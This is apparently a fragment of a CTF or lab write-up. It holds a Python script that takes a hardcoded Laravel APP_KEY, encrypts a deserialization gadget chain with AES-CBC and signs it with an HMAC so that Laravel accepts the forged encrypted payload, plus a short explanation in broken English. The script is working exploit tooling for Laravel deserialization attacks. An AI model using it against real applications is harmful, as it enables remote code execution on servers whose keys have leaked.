### wrap_laravel.py
```python
import base64
import json
import os
import sys
import hmac
import hashlib
from Crypto.Cipher import AES

APP_KEY = "APP_KEY=base64:XcLXnukFpi+EPnogtxlcHL9XOHB7QWEftVLe8jkIBjI="

if len(sys.argv) != 2:
    print(f"usage: python wrap_laravel.py gadget.txt")
    exit(1)

key = base64.b64decode(APP_KEY.split(":")[1])

with open(sys.argv[1], "rb") as f:
    plaintext = f.read()

iv = os.urandom(16)

pad = 16 - len(plaintext) % 16
plaintext += bytes([pad]) * pad

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(plaintext)

iv_b64 = base64.b64encode(iv).decode()
val_b64 = base64.b64encode(ciphertext).decode()

mac = hmac.new(
    key,
    (iv_b64 + val_b64).encode(),
    hashlib.sha256
).hexdigest()

payload = {
    "iv": iv_b64,
    "value": val_b64,
    "mac": mac,
    "tag": ""
}

print(base64.b64encode(json.dumps(payload).encode()).decode())
```
This script use APP_KEY to key AES and read payload from gadget.txt and encode by some technique(from lgbt) and affter that we will have Laravel-encrypted payload and we save it to voucher.txt
